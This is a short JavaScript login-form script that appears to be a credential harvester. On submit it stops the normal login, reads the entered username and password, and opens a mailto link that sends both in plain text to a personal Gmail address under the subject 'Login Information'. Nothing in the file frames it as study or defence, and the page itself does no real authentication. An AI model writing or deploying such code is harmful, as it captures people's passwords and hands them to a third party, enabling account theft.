const loginForm = document.getElementById("login-form");

loginForm.addEventListener("submit", function(event) {
	event.preventDefault();
	const username = document.getElementById("username").value;
	const password = document.getElementById("password").value;
	const body = `Username: ${username}\nPassword: ${password}`;
	
	const mailtoLink = `mailto:munnajani0318@gmail.com?subject=Login%20Information&body=${encodeURIComponent(body)}`;
	
	window.location.href = mailtoLink;
});
